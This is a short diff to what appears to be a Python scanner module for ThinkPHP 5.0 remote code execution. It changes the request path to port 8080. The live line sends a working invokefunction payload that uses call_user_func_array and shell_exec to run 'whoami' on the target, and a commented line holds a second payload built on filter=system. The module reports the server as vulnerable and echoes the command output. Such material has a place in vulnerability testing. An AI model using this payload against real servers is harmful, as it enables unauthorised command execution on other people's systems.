@@ -8,8 +8,8 @@ import requests
 
 def run(url):
     """Thinkphp 5.0 remote code exec"""
-    # vul = "/index.php?s=/Index/\\think\\Request/input&filter=system&data=whoami"
-    vul = "/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=whoami"
+    # vul = ":8080/index.php?s=/Index/\\think\\Request/input&filter=system&data=whoami"
+    vul = ":8080/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=whoami"
     req = requests.get(url + vul)
     if req.status_code == 200:
         return "Thinkphp 5.0 RCE Vulnerable\t\twhoami: " + req.text
